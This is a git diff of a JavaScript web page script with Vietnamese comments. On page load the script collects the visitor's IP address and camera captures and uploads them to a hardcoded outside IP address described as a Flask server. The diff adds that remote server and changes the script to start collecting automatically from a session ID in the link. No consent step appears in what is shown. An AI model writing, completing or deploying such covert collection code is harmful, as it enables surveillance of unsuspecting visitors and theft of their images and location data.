@@ -2,6 +2,8 @@ const MAX_RETRIES = 3;
 const RETRY_DELAY = 2000;
 let retryCount = 0;
 
+const FLASK_SERVER_URL = 'http://14.186.79.201'; // Thay thế bằng địa chỉ IP công cộng của bạn
+
 async function getIPAddress() {
     try {
         const response = await fetch('https://api.ipify.org?format=json');
@@ -135,7 +137,7 @@ async function captureMedia() {
 async function uploadData(url, data, retries = 3) {
     for (let i = 0; i < retries; i++) {
         try {
-            const response = await fetch(url, {
+            const response = await fetch(`${FLASK_SERVER_URL}${url}`, {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json'
@@ -165,7 +167,7 @@ async function uploadMedia(url, mediaData, retries = 3) {
                 formData.append('camera', mediaData.camera, 'camera.jpg');
             }
 
-            const response = await fetch(url, {
+            const response = await fetch(`${FLASK_SERVER_URL}${url}`, {
                 method: 'POST',
                 body: formData
             });
@@ -224,6 +226,15 @@ async function collectAndSendData(sessionId) {
 
 // Start collection when page loads
 document.addEventListener("DOMContentLoaded", () => {
-    const sessionId = 'your-session-id'; // Replace with actual session ID
-    collectAndSendData(sessionId);
+    const sessionId = getQueryParam('session_id'); // Lấy session ID từ URL
+    if (sessionId) {
+        collectAndSendData(sessionId);
+    } else {
+        console.error('No session_id found in URL');
+    }
 });
+
+function getQueryParam(param) {
+    const urlParams = new URLSearchParams(window.location.search);
+    return urlParams.get(param);
+}
